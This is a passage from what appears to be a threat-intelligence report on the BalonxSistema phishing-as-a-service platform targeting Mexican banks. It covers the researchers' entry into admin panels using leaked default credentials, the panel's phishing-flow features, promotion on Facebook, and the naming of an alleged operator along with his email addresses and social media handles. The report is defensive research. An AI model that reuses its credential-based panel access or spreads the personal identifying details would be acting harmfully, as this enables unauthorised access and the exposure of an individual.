style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\"><strong>Source</strong></p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\"><strong>Identifier</strong></p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\"><strong>Notes</strong></p></td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\"><strong>JWT Token</strong></p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\">josemorenofs19@gmail[.]com</p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\">Full, confirmed identity link to the malware bundle.</p></td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\"><strong>Git Commit (Slip)</strong></p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\">ferzamorafs19@gmail[.]com</p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\">Sibling Gmail account with matching suffix/surname.</p></td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\"><strong>Replit ID</strong></p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\">42753891 (ferzamorafs19)</p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\">Primary developer account.</p></td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\"><strong>Replit ID</strong></p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\">40580966 (greelgfs)</p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\">Secondary committer account.</p></td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\"><strong>Commit Timezone</strong></p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\">-0600 (México CST)</p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\">Direct confirmation of timezone.</p></td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\"><strong>Activity Pattern</strong></p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\">18:00–05:00 local MX peak</p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\">Confirms México base of operations.</p></td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\"><strong>WhatsApp Files</strong></p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\">Multiple +52 numbers (CDMX)</p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\">Confirms México operation and infrastructure control.</p></td></tr></tbody></table></figure><p>&nbsp;</p><p>&nbsp;</p><h1 style=\"text-align:justify;\">&nbsp;</h1><h1 style=\"text-align:justify;\">Access to Admin Panel</h1><p style=\"text-align:justify;\">During the investigation of the threat actor's repositories, a project was identified that utilizes Artificial Intelligence (AI) to automate fraudulent interactions with victims. Technical analysis of this project revealed an information leakage that exposed the default credentials configured for deployment. These credentials were subsequently tested against the administration panel of a domain hosting the project, successfully granting access to the administrative interface.</p><p>&nbsp;</p><p style=\"text-align:justify;\">Further testing confirmed that these credentials, due to password reuse, also provided access to the administration panel of the BalonxSistema Phishing-as-a-Service (PhaaS) platform.</p><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/6e11df9c22b138650de500032c4be2df41196bcfd028128d740c287f98a67935?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:6e11df9c22b138650de500032c4be2df41196bcfd028128d740c287f98a67935_IMAGE__\" width=\"624\" data-mce-src=\"__IMAGE_:6e11df9c22b138650de500032c4be2df41196bcfd028128d740c287f98a67935_IMAGE__\" /></p><h3 style=\"text-align:center;\"><i><strong>Figure 10.&nbsp;</strong>Administrative panel of BalonxSistema.</i></h3><p>&nbsp;</p><p style=\"text-align:justify;\">The administrative landing page displays exfiltrated victim credentials alongside sensitive financial data, including specific credit card information for at least one identified victim.</p><p>&nbsp;</p><p style=\"text-align:justify;\">With this access now we can see the all flow of how it works, all the banks that are being targeted in this campaign.&nbsp;</p><p style=\"text-align:justify;\">&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/2677c106811b7a873134ecf8da1b479c70be3525f8ba08556b59f630dd12e7aa?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:2677c106811b7a873134ecf8da1b479c70be3525f8ba08556b59f630dd12e7aa_IMAGE__\" width=\"624\" data-mce-src=\"__IMAGE_:2677c106811b7a873134ecf8da1b479c70be3525f8ba08556b59f630dd12e7aa_IMAGE__\" /></p><h3 style=\"text-align:center;\"><i><strong>Figure 11.&nbsp;</strong>List of all the banks affected by this campaign.</i></h3><p>&nbsp;</p><p style=\"text-align:justify;\">The operational efficacy of this campaign is fundamentally dependent upon the set of currently active domains. Through this investigative access, Group-IB has obtained entry to the administrative panel of&nbsp;<i><strong>digitalaclaracion[.]co</strong></i>. It is anticipated that other active domains within this infrastructure likely contain additional telemetry regarding new victims and collaborating cybercriminals.</p><p>&nbsp;</p><p style=\"text-align:justify;\">Within the&nbsp;<i><strong>Usuarios</strong></i> (Users) section of the panel, we identified a registry of threat actors affiliated with this specific domain. Based on the subscription values observed, these accounts are currently enrolled in the&nbsp;<i><strong>Individual Plan</strong></i>, as documented in&nbsp;hxxps://docs[.]google[.]com/document/d/1t-wSbR1NV1uRs5qXWgW69jIH9xTcRAj7dyW560nbAEY/edit?tab=t.0#heading=h.enbflz3lzi32.</p><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/577029dd9336cb1e2938e25b242e960588b330c2b49b484773c75c43837d6428?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:577029dd9336cb1e2938e25b242e960588b330c2b49b484773c75c43837d6428_IMAGE__\" width=\"624\" data-mce-src=\"__IMAGE_:577029dd9336cb1e2938e25b242e960588b330c2b49b484773c75c43837d6428_IMAGE__\" /></p><h3 style=\"text-align:center;\"><i><strong>Figure 12.&nbsp;</strong>Cybercriminals registered in this campaign.</i></h3><p>&nbsp;</p><p style=\"text-align:justify;\">The&nbsp;<i><strong>Links</strong></i> section provides a comprehensive inventory of generated URLs, accompanied by real-time status indicators specifying whether each session remains active or has reached expiration. Furthermore, this interface grants administrators the authority to generate additional links, extend existing session durations, or immediately terminate active sessions. We also can see the Bank that each session is targeting.&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/fc7934aa08b614d4a46e542786dcc658739e75e881626201d397065c9272689e?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:fc7934aa08b614d4a46e542786dcc658739e75e881626201d397065c9272689e_IMAGE__\" width=\"594\" data-mce-src=\"__IMAGE_:fc7934aa08b614d4a46e542786dcc658739e75e881626201d397065c9272689e_IMAGE__\" /></p><h3 style=\"text-align:center;\"><i><strong>Figure 13.&nbsp;</strong>Active sessions of the campaign.</i></h3><p>&nbsp;</p><p style=\"text-align:justify;\">The following section details the&nbsp;<i><strong>My Personal Flows</strong></i> functionality, a significant feature of this Phishing-as-a-Service (PhaaS) platform. This capability allows threat actors to orchestrate a sequence of deceptive screens, effectively customizing the phishing campaign to suit specific fraudulent scenarios. The system provides the following operational instructions:</p><p>&nbsp;</p><ul><li>The operator must select a target financial institution and configure the sequence of interfaces presented to the victim.</li><li>Upon the generation of a phishing link for the designated bank, the pre-configured personalized flow is automatically implemented.</li><li>Transition between screens occurs either based on a predefined temporal configuration or immediately upon the victim entering their sensitive information.</li></ul><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/c26fed48bc3af4f0d5d1062add9d6dcda078c82b06d2fb76d278554378e01574?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:c26fed48bc3af4f0d5d1062add9d6dcda078c82b06d2fb76d278554378e01574_IMAGE__\" width=\"553\" data-mce-src=\"__IMAGE_:c26fed48bc3af4f0d5d1062add9d6dcda078c82b06d2fb76d278554378e01574_IMAGE__\" /></p><h3 style=\"text-align:center;\"><i><strong>Figure 14.&nbsp;</strong>Creation of custom flows for the scam.</i></h3><p>&nbsp;</p><h2>Domain Based Infrastructure</h2><p style=\"text-align:justify;\">The operational model of this fraudulent campaign involves the continuous rotation of domains to maintain the persistence of the phishing infrastructure. As established domains are deactivated or decommissioned, the threat actors migrate their operations to new portals. The default project configurations facilitated comprehensive access to all associated domains. This access enabled the verification that the most recently established domain contains data identical to that of its predecessors. Such findings indicate a unified infrastructure wherein all domains transmit and present exfiltrated information derived from a centralized database.</p><p>&nbsp;</p><p style=\"text-align:justify;\">Technical analysis of associated GitHub repositories revealed alternative default credentials; however, subsequent attempts to utilize these for authentication on the new domain were unsuccessful.</p><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/5b4ab4fe68a3e0dd078c99fc147e2d2ebbae1f3e04f80883c4b4d2f5686d7f41?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:5b4ab4fe68a3e0dd078c99fc147e2d2ebbae1f3e04f80883c4b4d2f5686d7f41_IMAGE__\" width=\"508\" data-mce-src=\"__IMAGE_:5b4ab4fe68a3e0dd078c99fc147e2d2ebbae1f3e04f80883c4b4d2f5686d7f41_IMAGE__\" /></p><h3 style=\"text-align:center;\"><i><strong>Figure 15.&nbsp;</strong>2nd credentials for the Administrator.</i></h3><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/e22993d2494107900422884955ed6df3484e2b9570f8acd08d0bed329b409a7e?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:e22993d2494107900422884955ed6df3484e2b9570f8acd08d0bed329b409a7e_IMAGE__\" width=\"521\" data-mce-src=\"__IMAGE_:e22993d2494107900422884955ed6df3484e2b9570f8acd08d0bed329b409a7e_IMAGE__\" /></p><h3 style=\"text-align:center;\"><i><strong>Figure 16.&nbsp;</strong>Credentials of user “yako”.</i></h3><p>&nbsp;</p><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/ef3e26afe0a29e5f7ccb1856d11dd7fccad0e3bfec2da44580a8c5e5d1f29c16?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:ef3e26afe0a29e5f7ccb1856d11dd7fccad0e3bfec2da44580a8c5e5d1f29c16_IMAGE__\" width=\"391\" data-mce-src=\"__IMAGE_:ef3e26afe0a29e5f7ccb1856d11dd7fccad0e3bfec2da44580a8c5e5d1f29c16_IMAGE__\" /></p><h3 style=\"text-align:center;\"><i><strong>Figure 17.&nbsp;</strong>Credentials in the other phishing projects.</i></h3><p>&nbsp;</p><p style=\"text-align:justify;\">Upon acquiring this intelligence, the identified credentials were tested against the administration panel without success. However, the initial default credentials continue to provide administrative access. Furthermore, a new domain hosting a phishing page for one of the targeted brands was discovered. In this instance, all newly identified credentials successfully granted access to the panel, although no data was currently present. This suggests that the threat actors may be in the preparatory stages of a new phishing campaign.</p><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/d515c01878b1a8793f869970df152f4109b5eb9032e7af5d29fc37498b7a9412?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:d515c01878b1a8793f869970df152f4109b5eb9032e7af5d29fc37498b7a9412_IMAGE__\" width=\"535\" data-mce-src=\"__IMAGE_:d515c01878b1a8793f869970df152f4109b5eb9032e7af5d29fc37498b7a9412_IMAGE__\" /></p><h3 style=\"text-align:center;\"><i><strong>Figure 18.&nbsp;</strong>Panel of aclaracion-banamex[.]xyz</i></h3><p>&nbsp;</p><p style=\"text-align:justify;\">Going back to the newest domain of Balonx, we see one of the users is active and one session recently created.</p><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/f13cb5aa0be2dc66bb43bd45a2809fb6f6d0831b9c4cb5606c46e9f180309735?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:f13cb5aa0be2dc66bb43bd45a2809fb6f6d0831b9c4cb5606c46e9f180309735_IMAGE__\" width=\"624\" data-mce-src=\"__IMAGE_:f13cb5aa0be2dc66bb43bd45a2809fb6f6d0831b9c4cb5606c46e9f180309735_IMAGE__\" /></p><h3 style=\"text-align:center;\"><i><strong>Figure 19.&nbsp;</strong>User BIWI125 active.</i></h3><p>&nbsp;</p><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/d9a9676c5a1028b0190857a814d75f9ec16663b9ca70aa78e164bacc18834472?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:d9a9676c5a1028b0190857a814d75f9ec16663b9ca70aa78e164bacc18834472_IMAGE__\" width=\"624\" data-mce-src=\"__IMAGE_:d9a9676c5a1028b0190857a814d75f9ec16663b9ca70aa78e164bacc18834472_IMAGE__\" /></p><h3 style=\"text-align:center;\"><i><strong>Figure 20.&nbsp;</strong>Newest session of the phishing targeting Liverpool users.</i></h3><h1 style=\"text-align:justify;\">&nbsp;</h1><h1 style=\"text-align:justify;\">Advertising structure and admin identification</h1><h2>Service advertisement</h2><p style=\"text-align:justify;\">During the course of this investigation, Group-IB observed various advertisements facilitating the promotion of the PhaaS platform across numerous Facebook community groups. These digital environments, operating under nomenclature such as&nbsp;<i><strong>Base de Datos</strong></i> and&nbsp;<i><strong>Bases de datos Negocios Serios</strong></i>, serve as illicit hubs for the exchange of exfiltrated data. The participant demographic within these informal sectors primarily consists of telemarketing operatives and specialized threat actors.</p><p style=\"text-align:justify;\">Our intelligence indicates that promotional content for the Balonx system is disseminated via both comments and dedicated posts. Notably, the affiliated cybercriminals frequently leverage Facebook's anonymity features to obfuscate their primary identity during these recruitment and advertising activities.</p><p style=\"text-align:justify;\">&nbsp;</p><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/c3ccae763fb0a060a2eb5c7eeeed2ec8c3250c29671203722135c125d66e369c?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:c3ccae763fb0a060a2eb5c7eeeed2ec8c3250c29671203722135c125d66e369c_IMAGE__\" width=\"392\" data-mce-src=\"__IMAGE_:c3ccae763fb0a060a2eb5c7eeeed2ec8c3250c29671203722135c125d66e369c_IMAGE__\" /></p><h3 style=\"text-align:center;\"><i><strong>Figure 21</strong>. Direct promotion of the platform.</i></h3><p>&nbsp;</p><p style=\"text-align:justify;\">An alternative method of promotion was detected across the previously noted groups and within individual and public Facebook profiles. In these cases, individuals disseminated abbreviated video demonstrations illustrating the operational capabilities of the phishing infrastructure. In contrast to the explicit advertisements where victims were funneled toward Telegram, these specific publications directed prospective buyers to initiate contact via direct messaging.&nbsp; The minimal engagement and absence of personal data on these profiles, coupled with the recurring use of a standardized tutorial video, indicates that these accounts are either fraudulent accounts managed by the SuperAdmin or affiliated operatives functioning as resellers.&nbsp;</p><p style=\"text-align:justify;\">&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/dddb4917d69c1d9d9f023764f827db6e07b69aae375b1daf9360dd196696e5ac?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:dddb4917d69c1d9d9f023764f827db6e07b69aae375b1daf9360dd196696e5ac_IMAGE__\" width=\"434\" data-mce-src=\"__IMAGE_:dddb4917d69c1d9d9f023764f827db6e07b69aae375b1daf9360dd196696e5ac_IMAGE__\" /></p><h3 style=\"text-align:center;\"><i><strong>Figure 22</strong>. Indirect promotion of Balonx platform.</i></h3><p style=\"text-align:center;\">&nbsp;</p><p>&nbsp;</p><h2>Administrator’s “mask off”</h2><p style=\"text-align:justify;\">In the course of this inquiry, the primary operator was unmasked following a security lapse on social media. The individual engaged with a public request for fraudulent infrastructure using a personal, non-anonymized Facebook profile, effectively facilitating his definitive identification.</p><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/eb5fbba00554238fd26d67d40ff328240a35ead8c2909c85337f4161f52c586e?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:eb5fbba00554238fd26d67d40ff328240a35ead8c2909c85337f4161f52c586e_IMAGE__\" width=\"530\" data-mce-src=\"__IMAGE_:eb5fbba00554238fd26d67d40ff328240a35ead8c2909c85337f4161f52c586e_IMAGE__\" /></p><p style=\"text-align:center;\"><i><strong>Figure 23.</strong> Admin’s security slip</i></p><p>&nbsp;</p><p>&nbsp;</p><p style=\"text-align:justify;\">The individual identified through this forensic investigation is&nbsp;<strong>Brandon Ortega Tellez</strong>, a resident of Mexico City (CDMX). Technical analysis of his digital footprint reveals a curated public persona as a micro-influencer, primarily disseminating content related to freestyle athletics, fitness routines, and the display of luxury vehicles and international travel.</p><p>&nbsp;</p><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/e4f993effd56034fc2e1a5bdcdfe1d6df3026d56dd8b6bfee7930eba5feaa1a0?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:e4f993effd56034fc2e1a5bdcdfe1d6df3026d56dd8b6bfee7930eba5feaa1a0_IMAGE__\" width=\"402\" data-mce-src=\"__IMAGE_:e4f993effd56034fc2e1a5bdcdfe1d6df3026d56dd8b6bfee7930eba5feaa1a0_IMAGE__\" /></p><p style=\"text-align:center;\"><i><strong>Figure 24.</strong> Facebook photo of Balonx admin, Brandon</i></p><p>&nbsp;</p><p>&nbsp;</p><p style=\"text-align:justify;\">In addition to his digital footprint on Facebook, our technical inquiry successfully mapped associated TikTok and Instagram handles linked to the operator. This forensic pivot facilitated the discovery of a historical post that explicitly unmasked&nbsp;<strong>Brandon's</strong> legal identity.</p><p>&nbsp;</p><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/37385efb16712620fefba291dc8aa6a670500d2c4261c4db4abd5fcb53da4b11?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:37385efb16712620fefba291dc8aa6a670500d2c4261c4db4abd5fcb53da4b11_IMAGE__\" width=\"470\" data-mce-src=\"__IMAGE_:37385efb16712620fefba291dc8aa6a670500d2c4261c4db4abd5fcb53da4b11_IMAGE__\" /></p><p style=\"text-align:center;\"><i><strong>Figure 25.</strong> Instagram publication revealing Brandon’s government name.</i></p><p>&nbsp;</p><p>&nbsp;</p><p style=\"text-align:justify;\">Curiously, these social media presence lack any evidence of technical proficiency or software development expertise. Although not definitive, the GitHub repository for Balonx reveals two unique author signatures that do not align with Brandon, implying the current system likely originated from external developers. The procurement of tailored fraudulent development is a prevalent offering within the illicit Facebook communities where this PhaaS was promoted, indicating a high probability that the platform was outsourced.</p><p>&nbsp;</p><p style=\"text-align:justify;\">The convergence of identified aliases and social media handles linked to Brandon throughout this technical inquiry is consolidated in the table below:</p><p>&nbsp;</p><figure class=\"table\" style=\"float:left;width:100%;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:24.42%;\"><col style=\"width:24.42%;\"><col style=\"width:51.16%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>Alias</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>Platform</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>Notes</strong></td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p>balonxsistema</p><p>Jay</p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">Telegram</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">Directly linked to the PhaaS</td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">Brandon</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">Github repository</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">Directly linked to the PhaaS</td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p>Brandon Bj</p><p>Brandon Jay</p><p>Brandon.jay.3194</p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">Facebook</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">Personal account, basis for attribution&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">Jaystyle19</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">Instagram</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">Linked to real identity&nbsp;</td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">Jaystyle_</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">Tiktok</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">Linked to real identity&nbsp;</td></tr></tbody></table></figure><h2>&nbsp;</h2><h2>Conclusions</h2><p style=\"text-align:justify;\">The identification and rigorous technical analysis of the \"Balonx Sistema\" Phishing-as-a-Service (PhaaS) platform represent a critical achievement in defending the Mexican financial sector. This discovery provides our clients with unprecedented defensive foresight by exposing the adversary's entire operational lifecycle, from initial advertisement of the PhaaS to the infrastructure deployment ending with the real-time credential exfiltration.</p><p>&nbsp;</p><p style=\"text-align:justify;\">The pivotal exploitation of information leakage, which facilitated administrative access to the platform's control panel, was instrumental in transforming this investigation; it granted us granular visibility into threat actor behavior, victim targeting, and session management that would otherwise remain opaque. Given the adversary’s demonstrated reliance on rapid domain rotation to maintain persistence, ongoing and rigorous monitoring of new infrastructure is essential to proactively neutralize future campaigns.</p><p>&nbsp;</p><p style=\"text-align:justify;\">Ultimately, the depth and actionable nature of these findings underscore the strategic synergy between the Threat Intelligence and Digital Risk Protection teams, confirming that our collaborative approach is the fundamental cornerstone of our proactive security posture.</p>",
+ "displayOptions": {
+  "isFavourite": false,
+  "isHidden": false
+ },
+ "evaluation": {
+  "admiraltyCode": "C3",
+  "credibility": 60,
+  "reliability": 60,
+  "severity": "orange",
+  "tlp": "amber",
+  "ttl": null
+ },
+ "expertise": [
+  "Phishing",
+  "Unique_data"
+ ],
+ "files": [
+  {
+   "hash": "9d0fe3a66f1b9cc0b6aa35cbfe76709c8500b07b1cee503e95d939e057e6ecc0",
+   "mime": "image/png",
+   "name": "9d0fe3a66f1b9cc0b6aa35cbfe76709c8500b07b1cee503e95d939e057e6ecc0",
+   "size": 559110
+  },
+  {
+   "hash": "24e53501d7609e381e2e8428dafbcf1352ba8361644ac19f11028c527ea38cf8",
+   "mime": "image/png",
+   "name": "24e53501d7609e381e2e8428dafbcf1352ba8361644ac19f11028c527ea38cf8",
+   "size": 1784414
+  },
+  {
+   "hash": "ddabafe506112e1405f7fd894a3648589fec10cf74a3239df9b8b64e3cd5aa12",
+   "mime": "image/png",
+   "name": "ddabafe506112e1405f7fd894a3648589fec10cf74a3239df9b8b64e3cd5aa12",
+   "size": 1661206
+  },
+  {
+   "hash": "f589adb1e5f53c3c6f806d77a5351cdab498cf91d99db0662280b8f3f25c6d76",
+   "mime": "image/png",
+   "name": "f589adb1e5f53c3c6f806d77a5351cdab498cf91d99db0662280b8f3f25c6d76",
+   "size": 1366435
+  },
+  {
+   "hash": "53447b32045509adcb0f73a7f15b74e603b5d7d6f9a109bf56ba5eeac45fafed",
+   "mime": "image/png",
+   "name": "53447b32045509adcb0f73a7f15b74e603b5d7d6f9a109bf56ba5eeac45fafed",
+   "size": 1006768
+  },
+  {
+   "hash": "46d744fdf2e1ea2e3efb5e846e3367c45cdf28c92aa425ef0aed97cf34989b2c",
+   "mime": "image/png",
+   "name": "46d744fdf2e1ea2e3efb5e846e3367c45cdf28c92aa425ef0aed97cf34989b2c",
+   "size": 553746
+  },
+  {
+   "hash": "56b043d65efb2a038d8a23b48242c28c2632530fd5fe8ddb6d2c3704d4d8505a",
+   "mime": "image/png",
+   "name": "56b043d65efb2a038d8a23b48242c28c2632530fd5fe8ddb6d2c3704d4d8505a",
+   "size": 71033
+  },
+  {
+   "hash": "214b7196ac256571f763e42d0818e73412d5e03c0116a7d340e24753f571b9d9",
+   "mime": "image/png",
+   "name": "214b7196ac256571f763e42d0818e73412d5e03c0116a7d340e24753f571b9d9",
+   "size": 2937837
+  },
+  {
+   "hash": "971a36f5cc716b89bb8b859e547c1ed326ecc2a43c86d4b1d76d0e9d3af94afc",
+   "mime": "image/png",
+   "name": "971a36f5cc716b89bb8b859e547c1ed326ecc2a43c86d4b1d76d0e9d3af94afc",
+   "size": 2559659
+  },
+  {
+   "hash": "6e11df9c22b138650de500032c4be2df41196bcfd028128d740c287f98a67935",
+   "mime": "image/png",
+   "name": "6e11df9c22b138650de500032c4be2df41196bcfd028128d740c287f98a67935",
+   "size": 2021319
+  },
+  {
+   "hash": "2677c106811b7a873134ecf8da1b479c70be3525f8ba08556b59f630dd12e7aa",
+   "mime": "image/png",
+   "name": "2677c106811b7a873134ecf8da1b479c70be3525f8ba08556b59f630dd12e7aa",
+   "size": 612620
+  },
+  {
+   "hash": "577029dd9336cb1e2938e25b242e960588b330c2b49b484773c75c43837d6428",
+   "mime": "image/png",
+   "name": "577029dd9336cb1e2938e25b242e960588b330c2b49b484773c75c43837d6428",
+   "size": 573643
+  },
+  {
+   "hash": "fc7934aa08b614d4a46e542786dcc658739e75e881626201d397065c9272689e",
+   "mime": "image/png",
+   "name": "fc7934aa08b614d4a46e542786dcc658739e75e881626201d397065c9272689e",
+   "size": 562053
+  },
+  {
+   "hash": "c26fed48bc3af4f0d5d1062add9d6dcda078c82b06d2fb76d278554378e01574",
+   "mime": "image/png",
+   "name": "c26fed48bc3af4f0d5d1062add9d6dcda078c82b06d2fb76d278554378e01574",
+   "size": 569925
+  },
+  {
+   "hash": "5b4ab4fe68a3e0dd078c99fc147e2d2ebbae1f3e04f80883c4b4d2f5686d7f41",
+   "mime": "image/jpeg",
+   "name": "5b4ab4fe68a3e0dd078c99fc147e2d2ebbae1f3e04f80883c4b4d2f5686d7f41",
+   "size": 83276
+  },
+  {
+   "hash": "e22993d2494107900422884955ed6df3484e2b9570f8acd08d0bed329b409a7e",
+   "mime": "image/jpeg",
+   "name": "e22993d2494107900422884955ed6df3484e2b9570f8acd08d0bed329b409a7e",
+   "size": 68578
+  },
+  {
+   "hash": "ef3e26afe0a29e5f7ccb1856d11dd7fccad0e3bfec2da44580a8c5e5d1f29c16",
+   "mime": "image/png",
+   "name": "ef3e26afe0a29e5f7ccb1856d11dd7fccad0e3bfec2da44580a8c5e5d1f29c16",
+   "size": 179137
+  },
+  {
+   "hash": "d515c01878b1a8793f869970df152f4109b5eb9032e7af5d29fc37498b7a9412",
+   "mime": "image/png",
+   "name": "d515c01878b1a8793f869970df152f4109b5eb9032e7af5d29fc37498b7a9412",
+   "size": 119785
+  },
+  {
+   "hash": "f13cb5aa0be2dc66bb43bd45a2809fb6f6d0831b9c4cb5606c46e9f180309735",
+   "mime": "image/png",
+   "name": "f13cb5aa0be2dc66bb43bd45a2809fb6f6d0831b9c4cb5606c46e9f180309735",
+   "size": 247147
+  },
+  {
+   "hash": "d9a9676c5a1028b0190857a814d75f9ec16663b9ca70aa78e164bacc18834472",
+   "mime": "image/png",
+   "name": "d9a9676c5a1028b0190857a814d75f9ec16663b9ca70aa78e164bacc18834472",
+   "size": 449736
+  },
+  {
+   "hash": "c3ccae763fb0a060a2eb5c7eeeed2ec8c3250c29671203722135c125d66e369c",
+   "mime": "image/png",
+   "name": "c3ccae763fb0a060a2eb5c7eeeed2ec8c3250c29671203722135c125d66e369c",
+   "size": 66501
+  },
+  {
+   "hash": "dddb4917d69c1d9d9f023764f827db6e07b69aae375b1daf9360dd196696e5ac",
+   "mime": "image/png",
+   "name": "dddb4917d69c1d9d9f023764f827db6e07b69aae375b1daf9360dd196696e5ac",
+   "size": 56808
+  },
+  {
